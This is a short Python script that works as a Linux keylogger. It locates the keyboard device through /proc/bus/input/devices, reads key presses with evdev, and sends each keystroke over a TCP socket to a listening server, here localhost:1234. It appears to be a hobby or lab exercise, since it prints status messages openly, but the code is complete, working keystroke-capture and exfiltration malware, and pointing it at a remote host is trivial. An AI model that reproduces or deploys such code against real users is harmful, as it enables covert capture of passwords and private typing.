from evdev import *
import os, re
import socket

s = socket.socket()
try:
    s.connect(('localhost', 1234))
except ConnectionRefusedError:
    print("Connection to server failed. Is it running?")
    exit(1)

def find_file(f):
    if not os.path.exists(f):
        print(f"Couldn't find: {f}")
        return None
    print(f"Found: {f}")
    return f
    
def read_file(f):
    content = open(f, 'r')
    return content.read()

def find_device(content):
    blocks = content.strip().split("\n\n")
    for block in blocks:
        if re.search(r'.*Name=\".*keyboard.*\"', block, re.IGNORECASE):
            print('Found keyboard device!')
            device = re.search(r'Handlers=.*\b(event\d+)\b', block, re.IGNORECASE)
            if device:
                return device.group(1)

def listen_device_input(f):
    device = InputDevice(f)
    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                s.sendall(str(key_event).encode())
                print(f"Key pressed: {key_event}\n")

f = "/proc/bus/input/devices"

find_file(f)
content = read_file(f)
print(content)
result = "/dev/input/" + find_device(content)

try:
    listen_device_input(result)
except KeyboardInterrupt:
    print("Stopped by user.")
